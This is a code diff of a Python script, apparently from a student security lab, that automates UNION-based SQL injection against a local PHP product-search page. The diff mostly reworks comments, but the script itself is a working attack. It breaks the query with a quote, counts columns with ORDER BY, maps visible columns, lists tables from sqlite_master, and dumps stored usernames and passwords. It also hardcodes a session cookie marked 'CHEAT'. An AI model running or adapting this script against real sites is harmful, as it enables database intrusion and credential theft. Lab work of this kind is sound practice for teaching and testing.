@@ -3,7 +3,6 @@ from bs4 import BeautifulSoup
 import time
 import re
 
-# --- Configuration ---
 BASE_URL = "http://localhost/CyberProject" 
 sid = "rv82jh01b0c0pq4ift362fg6vp" # CHEAT - replace with a valid session ID obtained from a successful login or the SQLi bypass
 
@@ -23,13 +22,7 @@ def dump_users(target_url="http://localhost/CyberProject/products.php", session_
     def check_for_error(html):
         return "SQL Error" in html or "Fatal error" in html or "exception" in html.lower()
 
-    # ==========================================
-    # Script Start
-    # ==========================================
-
-
-    #----------------------------------------------------------------------------------------------
-    # --- Step 1: check if SQLi exists ---
+    # Step 1: check if SQLi exists
     print_step("Sanity Check", "%'", "Sending a single quote to break the query syntax.")
     cookies = {'PHPSESSID': session_id} if session_id else {}
     found_creds = []
@@ -41,8 +34,8 @@ def dump_users(target_url="http://localhost/CyberProject/products.php", session_
         print("[-] No error returned. Check if the Session ID is valid and the site is running.")
 
 
-    #----------------------------------------------------------------------------------------------
-    # --- Step 2: determine how much columns there are in the original query (SELECT) ---
+    
+    # Step 2: determine how much columns there are in the original query (SELECT)
     detected_cols = 0
     print_step("Enumeration - Column Count", "%' ORDER BY X --", "Incrementing ORDER BY until the page breaks.")
 
@@ -62,18 +55,23 @@ def dump_users(target_url="http://localhost/CyberProject/products.php", session_
         detected_cols = 5
 
 
-    #----------------------------------------------------------------------------------------------
-    # --- Step 3: find wich columns we see in the browser (meanning, in the HTML) ---
+
+    # Step 3: find which columns we see in the browser (meaning, in the HTML)
     visible_indices = []
     print_step("Mapping Visible Columns", "UNION SELECT markers...", "Injecting markers and searching ONLY in visible text.")
 
+    # [0, 1, 2, 3]
+    # ['COL_1', 'COL_2', 'COL_3', 'COL_4']
     markers = [f"COL_{i+1}" for i in range(detected_cols)]
+    # ["'COL_1'", "'COL_2'", "'COL_3'", "'COL_4'"]
+    # markers_str = "'COL_1', 'COL_2', 'COL_3', 'COL_4'"
     markers_str = ", ".join([f"'{m}'" for m in markers])
+    # ZZZ%' UNION SELECT 'COL_1', 'COL_2', 'COL_3', 'COL_4'
     payload_map = f"ZZZ%' UNION SELECT {markers_str} --"
 
     res = requests.get(target_url, params={'q': payload_map}, cookies=cookies)
+    # parses the HTML returned by the server into a navigable tree using BeautifulSoup
     soup = BeautifulSoup(res.text, 'html.parser')
-
     page_text = soup.get_text() 
 
     for i, marker in enumerate(markers):
@@ -85,11 +83,16 @@ def dump_users(target_url="http://localhost/CyberProject/products.php", session_
         visible_indices = [1, 2] 
         print("[-] No visible columns detected in text. Using defaults.")
 
-    #----------------------------------------------------------------------------------------------
-    # --- Step 4: find table's names ---
+    
+    # Step 4: find table's names
     union_cols = ["NULL"] * detected_cols
+    # don't leave null so the page will not skip rendering.
     union_cols[0] = "rowid" 
+    # decide which column to inject the table names into (preferably a visible one)
     name_slot = visible_indices[0] if len(visible_indices) > 0 else 1
+    # Put the actual extraction expression into that visible slot.
+    #name is the column from sqlite_master holding each table's name.
+    # printf('!!!%s!!!', name) wraps the value in !!!...!!! sentinels so later you can pull them back out of the noisy HTML
     union_cols[name_slot] = "printf('!!!%s!!!', name)"
 
     columns_str = ", ".join(union_cols)
@@ -99,12 +102,13 @@ def dump_users(target_url="http://localhost/CyberProject/products.php", session_
     res = requests.get(target_url, params={'q': payload_tables}, cookies=cookies)
 
     tables = re.findall(r'!!!(.*?)!!!', res.text)
+    # because !!!%s!!! will be part of the HTMl
     tables = list(set([t for t in tables if t != "%s"]))
 
     print(f"\033[1;36m[+] Tables found in DB: {', '.join(tables)}\033[0m")
 
-    #----------------------------------------------------------------------------------------------
-    # --- Step 5: Dump Users and Passwords (article-card version, with ID fix) ---
+    
+    # Step 5: Dump Users and Passwords (article-card version, with ID fix)
     if 'users' in tables:
         target_cols = ["NULL"] * detected_cols
         target_cols[0] = "id" 
@@ -122,6 +126,8 @@ def dump_users(target_url="http://localhost/CyberProject/products.php", session_
         res = requests.get(target_url, params={'q': payload_users}, cookies=cookies)
         soup = BeautifulSoup(res.text, 'html.parser')
         
+        # can know this after research in the HTML page
+        # עופר ונעם צריך לחשוב אם באלנו לשנות את זה
         cards = soup.find_all('article', class_='product-card')
         
         print("\n\033[1;41;37m[!!!] BREACH RESULTS:\033[0m")
